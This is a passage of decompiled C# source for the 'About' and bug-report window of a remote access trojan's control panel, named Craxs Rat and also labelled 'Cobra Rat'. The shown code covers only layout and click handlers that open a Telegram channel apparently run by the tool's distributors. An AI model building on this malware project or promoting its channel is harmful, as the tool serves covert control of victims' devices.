using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class CraxsAbout : Form
{
	private IContainer components;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox4")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox _PictureBox4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButton1")]
	private DrakeUIButton _DrakeUIButton1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("toppanel")]
	[CompilerGenerated]
	private Panel _toppanel;

	[AccessedThroughProperty("DrakeUIButton4")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButton _DrakeUIButton4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar6")]
	private DrakeUIAvatar _DrakeUIAvatar6;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox3")]
	[CompilerGenerated]
	private PictureBox _PictureBox3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox5")]
	private PictureBox _PictureBox5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox6")]
	private PictureBox _PictureBox6;

	public string usermail;

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatseraa;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal virtual DrakeUIToolTip DrakeUIToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox PictureBox4
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsbetsegr;
			PictureBox pictureBox = _PictureBox4;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			_PictureBox4 = value;
			pictureBox = _PictureBox4;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bdytext")]
	internal virtual DrakeUITextBox bdytext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("subtext")]
	internal virtual DrakeUITextBox subtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("reqbtn")]
	internal virtual DrakeUIButtonIcon reqbtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButton DrakeUIButton1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButton1_Click;
			DrakeUIButton drakeUIButton = _DrakeUIButton1;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_DrakeUIButton1 = value;
			drakeUIButton = _DrakeUIButton1;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	internal virtual Panel toppanel
	{
		[CompilerGenerated]
		get
		{
			return _toppanel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Toppanel_MouseDown;
			Panel panel = _toppanel;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_toppanel = value;
			panel = _toppanel;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual DrakeUIButton DrakeUIButton4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButton4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButton4_Click;
			DrakeUIButton drakeUIButton = _DrakeUIButton4;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click -= value2;
			}
			_DrakeUIButton4 = value;
			drakeUIButton = _DrakeUIButton4;
			if (drakeUIButton != null)
			{
				drakeUIButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("aboutpanel")]
	internal virtual Panel aboutpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("reportpanel")]
	internal virtual Panel reportpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIAvatar DrakeUIAvatar6
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar6_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar6;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar6 = value;
			drakeUIAvatar = _DrakeUIAvatar6;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox PictureBox3
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsergasrg;
			MouseEventHandler value3 = CraxsAbout_MouseDown;
			PictureBox pictureBox = _PictureBox3;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
				pictureBox.MouseDown -= value3;
			}
			_PictureBox3 = value;
			pictureBox = _PictureBox3;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
				pictureBox.MouseDown += value3;
			}
		}
	}

	internal virtual PictureBox PictureBox5
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsrt;
			PictureBox pictureBox = _PictureBox5;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			_PictureBox5 = value;
			pictureBox = _PictureBox5;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	internal virtual PictureBox PictureBox6
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwer;
			PictureBox pictureBox = _PictureBox6;
			if (pictureBox != null)
			{
				pictureBox.Click -= value2;
			}
			_PictureBox6 = value;
			pictureBox = _PictureBox6;
			if (pictureBox != null)
			{
				pictureBox.Click += value2;
			}
		}
	}

	public CraxsAbout()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwrg;
		base.MouseDown += CraxsAbout_MouseDown;
		base.FormClosing += CraxsAbout_FormClosing;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.CraxsAbout));
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.PictureBox4 = new System.Windows.Forms.PictureBox();
		this.subtext = new DrakeUI.Framework.DrakeUITextBox();
		this.bdytext = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeUIAvatar6 = new DrakeUI.Framework.DrakeUIAvatar();
		this.reqbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label7 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.Label5 = new System.Windows.Forms.Label();
		this.DrakeUIButton1 = new DrakeUI.Framework.DrakeUIButton();
		this.toppanel = new System.Windows.Forms.Panel();
		this.DrakeUIButton4 = new DrakeUI.Framework.DrakeUIButton();
		this.aboutpanel = new System.Windows.Forms.Panel();
		this.Label9 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		this.reportpanel = new System.Windows.Forms.Panel();
		this.PictureBox6 = new System.Windows.Forms.PictureBox();
		this.PictureBox5 = new System.Windows.Forms.PictureBox();
		this.PictureBox3 = new System.Windows.Forms.PictureBox();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label4 = new System.Windows.Forms.Label();
		this.Label8 = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox4).BeginInit();
		this.toppanel.SuspendLayout();
		this.aboutpanel.SuspendLayout();
		this.reportpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox6).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox5).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).BeginInit();
		base.SuspendLayout();
		this.PictureBox1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.PictureBox1.Image = (System.Drawing.Image)resources.GetObject("PictureBox1.Image");
		this.PictureBox1.Location = new System.Drawing.Point(82, 341);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(92, 87);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox1.TabIndex = 22;
		this.PictureBox1.TabStop = false;
		this.DrakeUIToolTip1.SetToolTip(this.PictureBox1, "Cobra Rat");
		this.PictureBox1.Visible = false;
		this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(54, 54, 54);
		this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(239, 239, 239);
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.PictureBox4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.PictureBox4.Image = (System.Drawing.Image)resources.GetObject("PictureBox4.Image");
		this.PictureBox4.Location = new System.Drawing.Point(859, 341);
		this.PictureBox4.Name = "PictureBox4";
		this.PictureBox4.Size = new System.Drawing.Size(79, 87);
		this.PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox4.TabIndex = 24;
		this.PictureBox4.TabStop = false;
		this.DrakeUIToolTip1.SetToolTip(this.PictureBox4, "Support");
		this.PictureBox4.Visible = false;
		this.subtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.subtext.FillColor = System.Drawing.Color.Black;
		this.subtext.Font = new System.Drawing.Font("Calibri", 12f);
		this.subtext.ForeColor = System.Drawing.Color.White;
		this.subtext.Location = new System.Drawing.Point(133, 27);
		this.subtext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.subtext.Maximum = 2147483647.0;
		this.subtext.MaxLength = 15;
		this.subtext.Minimum = -2147483648.0;
		this.subtext.Name = "subtext";
		this.subtext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.subtext.RectColor = System.Drawing.Color.SkyBlue;
		this.subtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.subtext.Size = new System.Drawing.Size(738, 32);
		this.subtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.subtext.TabIndex = 41;
		this.subtext.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeUIToolTip1.SetToolTip(this.subtext, "Max 15 letter");
		this.bdytext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.bdytext.FillColor = System.Drawing.Color.Black;
		this.bdytext.Font = new System.Drawing.Font("Calibri", 12f);
		this.bdytext.Location = new System.Drawing.Point(133, 75);
		this.bdytext.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.bdytext.Maximum = 2147483647.0;
		this.bdytext.MaxLength = 150;
		this.bdytext.Minimum = -2147483648.0;
		this.bdytext.Multiline = true;
		this.bdytext.Name = "bdytext";
		this.bdytext.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.bdytext.RectColor = System.Drawing.Color.FromArgb(230, 80, 80);
		this.bdytext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.bdytext.Size = new System.Drawing.Size(872, 459);
		this.bdytext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.bdytext.StyleCustomMode = true;
		this.bdytext.TabIndex = 42;
		this.bdytext.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.DrakeUIToolTip1.SetToolTip(this.bdytext, "Max 150 letter");
		this.DrakeUIAvatar6.AvatarSize = 25;
		this.DrakeUIAvatar6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar6.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar6.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar6.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar6.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar6.Location = new System.Drawing.Point(1016, 0);
		this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
		this.DrakeUIAvatar6.Size = new System.Drawing.Size(46, 54);
		this.DrakeUIAvatar6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar6.Symbol = 61453;
		this.DrakeUIAvatar6.SymbolSize = 25;
		this.DrakeUIAvatar6.TabIndex = 52;
		this.DrakeUIAvatar6.Text = "DrakeUIAvatar3";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar6, "Exit");
		this.reqbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.reqbtn.FillColor = System.Drawing.Color.Black;
		this.reqbtn.FillDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.reqbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.reqbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.reqbtn.Location = new System.Drawing.Point(879, 24);
		this.reqbtn.Name = "reqbtn";
		this.reqbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.reqbtn.RectDisableColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.reqbtn.Size = new System.Drawing.Size(126, 33);
		this.reqbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.reqbtn.Symbol = 61913;
		this.reqbtn.TabIndex = 44;
		this.reqbtn.Text = "Send";
		this.Label7.AutoSize = true;
		this.Label7.BackColor = System.Drawing.Color.Transparent;
		this.Label7.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.Label7.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label7.Location = new System.Drawing.Point(194, -67);
		this.Label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(371, 24);
		this.Label7.TabIndex = 43;
		this.Label7.Text = "Please Send only feedback and report bugs";
		this.Label6.AutoSize = true;
		this.Label6.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label6.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label6.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label6.Location = new System.Drawing.Point(13, 75);
		this.Label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(104, 24);
		this.Label6.TabIndex = 42;
		this.Label6.Tag = "1";
		this.Label6.Text = "Description";
		this.Label6.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label5.AutoSize = true;
		this.Label5.Cursor = System.Windows.Forms.Cursors.Default;
		this.Label5.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.Label5.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label5.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label5.Location = new System.Drawing.Point(13, 24);
		this.Label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(71, 24);
		this.Label5.TabIndex = 40;
		this.Label5.Tag = "1";
		this.Label5.Text = "Subject";
		this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.DrakeUIButton1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButton1.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButton1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButton1.FillDisableColor = System.Drawing.Color.Red;
		this.DrakeUIButton1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButton1.Location = new System.Drawing.Point(0, 0);
		this.DrakeUIButton1.Name = "DrakeUIButton1";
		this.DrakeUIButton1.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.LeftBottom | DrakeUI.Framework.UICornerRadiusSides.RightBottom;
		this.DrakeUIButton1.RectColor = System.Drawing.Color.Red;
		this.DrakeUIButton1.RectDisableColor = System.Drawing.Color.FromArgb(255, 255, 192);
		this.DrakeUIButton1.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButton1.Size = new System.Drawing.Size(230, 54);
		this.DrakeUIButton1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButton1.StyleCustomMode = true;
		this.DrakeUIButton1.TabIndex = 48;
		this.DrakeUIButton1.Text = "About";
		this.DrakeUIButton1.Visible = false;
		this.toppanel.Controls.Add(this.DrakeUIAvatar6);
		this.toppanel.Controls.Add(this.DrakeUIButton4);
		this.toppanel.Controls.Add(this.DrakeUIButton1);
		this.toppanel.Dock = System.Windows.Forms.DockStyle.Top;
		this.toppanel.Location = new System.Drawing.Point(0, 0);
		this.toppanel.Name = "toppanel";
		this.toppanel.Size = new System.Drawing.Size(1062, 54);
		this.toppanel.TabIndex = 49;
		this.DrakeUIButton4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButton4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButton4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButton4.FillDisableColor = System.Drawing.Color.Red;
		this.DrakeUIButton4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButton4.Location = new System.Drawing.Point(230, 0);
		this.DrakeUIButton4.Name = "DrakeUIButton4";
		this.DrakeUIButton4.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.LeftBottom | DrakeUI.Framework.UICornerRadiusSides.RightBottom;
		this.DrakeUIButton4.RectColor = System.Drawing.Color.Red;
		this.DrakeUIButton4.RectDisableColor = System.Drawing.Color.FromArgb(255, 255, 192);
		this.DrakeUIButton4.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButton4.Size = new System.Drawing.Size(230, 54);
		this.DrakeUIButton4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButton4.StyleCustomMode = true;
		this.DrakeUIButton4.TabIndex = 51;
		this.DrakeUIButton4.Text = "Report";
		this.DrakeUIButton4.Visible = false;
		this.aboutpanel.BackColor = System.Drawing.Color.Black;
		this.aboutpanel.Controls.Add(this.Label9);
		this.aboutpanel.Controls.Add(this.Label8);
		this.aboutpanel.Controls.Add(this.Label4);
		this.aboutpanel.Controls.Add(this.Label3);
		this.aboutpanel.Controls.Add(this.Label1);
		this.aboutpanel.Controls.Add(this.PictureBox1);
		this.aboutpanel.Controls.Add(this.PictureBox3);
		this.aboutpanel.Controls.Add(this.PictureBox5);
		this.aboutpanel.Controls.Add(this.PictureBox6);
		this.aboutpanel.Controls.Add(this.PictureBox4);
		this.aboutpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.aboutpanel.Location = new System.Drawing.Point(0, 54);
		this.aboutpanel.Name = "aboutpanel";
		this.aboutpanel.Size = new System.Drawing.Size(1062, 834);
		this.aboutpanel.TabIndex = 50;
		this.Label9.BackColor = System.Drawing.Color.Black;
		this.Label9.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.Label9.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label9.Location = new System.Drawing.Point(859, 431);
		this.Label9.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label9.Name = "Label9";
		this.Label9.Size = new System.Drawing.Size(79, 39);
		this.Label9.TabIndex = 31;
		this.Label9.Text = "Support";
		this.Label9.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label9.Visible = false;
		this.Label1.BackColor = System.Drawing.Color.Black;
		this.Label1.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(82, 431);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(92, 39);
		this.Label1.TabIndex = 27;
		this.Label1.Text = "Site";
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label1.Visible = false;
		this.reportpanel.Controls.Add(this.reqbtn);
		this.reportpanel.Controls.Add(this.Label6);
		this.reportpanel.Controls.Add(this.Label7);
		this.reportpanel.Controls.Add(this.Label5);
		this.reportpanel.Controls.Add(this.bdytext);
		this.reportpanel.Controls.Add(this.subtext);
		this.reportpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.reportpanel.Location = new System.Drawing.Point(0, 54);
		this.reportpanel.Name = "reportpanel";
		this.reportpanel.Size = new System.Drawing.Size(1062, 834);
		this.reportpanel.TabIndex = 51;
		this.PictureBox6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.PictureBox6.Image = (System.Drawing.Image)resources.GetObject("PictureBox6.Image");
		this.PictureBox6.Location = new System.Drawing.Point(477, 341);
		this.PictureBox6.Name = "PictureBox6";
		this.PictureBox6.Size = new System.Drawing.Size(79, 87);
		this.PictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox6.TabIndex = 26;
		this.PictureBox6.TabStop = false;
		this.DrakeUIToolTip1.SetToolTip(this.PictureBox6, "Twitter");
		this.PictureBox6.Visible = false;
		this.PictureBox5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.PictureBox5.Image = (System.Drawing.Image)resources.GetObject("PictureBox5.Image");
		this.PictureBox5.Location = new System.Drawing.Point(286, 341);
		this.PictureBox5.Name = "PictureBox5";
		this.PictureBox5.Size = new System.Drawing.Size(79, 87);
		this.PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox5.TabIndex = 25;
		this.PictureBox5.TabStop = false;
		this.DrakeUIToolTip1.SetToolTip(this.PictureBox5, "FaceBook");
		this.PictureBox5.Visible = false;
		this.PictureBox3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.PictureBox3.Image = (System.Drawing.Image)resources.GetObject("PictureBox3.Image");
		this.PictureBox3.Location = new System.Drawing.Point(668, 341);
		this.PictureBox3.Name = "PictureBox3";
		this.PictureBox3.Size = new System.Drawing.Size(79, 87);
		this.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox3.TabIndex = 23;
		this.PictureBox3.TabStop = false;
		this.DrakeUIToolTip1.SetToolTip(this.PictureBox3, "Telegram");
		this.PictureBox3.Visible = false;
		this.Label3.BackColor = System.Drawing.Color.Black;
		this.Label3.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.Label3.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label3.Location = new System.Drawing.Point(286, 431);
		this.Label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(79, 39);
		this.Label3.TabIndex = 28;
		this.Label3.Text = "FaceBook";
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label3.Visible = false;
		this.Label4.BackColor = System.Drawing.Color.Black;
		this.Label4.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label4.Location = new System.Drawing.Point(477, 431);
		this.Label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(79, 39);
		this.Label4.TabIndex = 29;
		this.Label4.Text = "Twitter";
		this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label4.Visible = false;
		this.Label8.BackColor = System.Drawing.Color.Black;
		this.Label8.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold);
		this.Label8.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label8.Location = new System.Drawing.Point(668, 431);
		this.Label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label8.Name = "Label8";
		this.Label8.Size = new System.Drawing.Size(79, 39);
		this.Label8.TabIndex = 30;
		this.Label8.Text = "Telegram";
		this.Label8.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label8.Visible = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(1062, 888);
		base.Controls.Add(this.aboutpanel);
		base.Controls.Add(this.reportpanel);
		base.Controls.Add(this.toppanel);
		this.ForeColor = System.Drawing.Color.White;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "CobraAbout";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "CobraAbout";
		base.TopMost = true;
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox4).EndInit();
		this.toppanel.ResumeLayout(false);
		this.aboutpanel.ResumeLayout(false);
		this.reportpanel.ResumeLayout(false);
		this.reportpanel.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox6).EndInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox5).EndInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).EndInit();
		base.ResumeLayout(false);
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatseraa(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
			Interaction.MsgBox("");
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsergasrg(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsbetsegr(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsrt(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://t.me/DarKnet_JoKer");
		}
		catch (Exception)
		{
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsergwer(object sender, EventArgs e)
	{
		try
		{
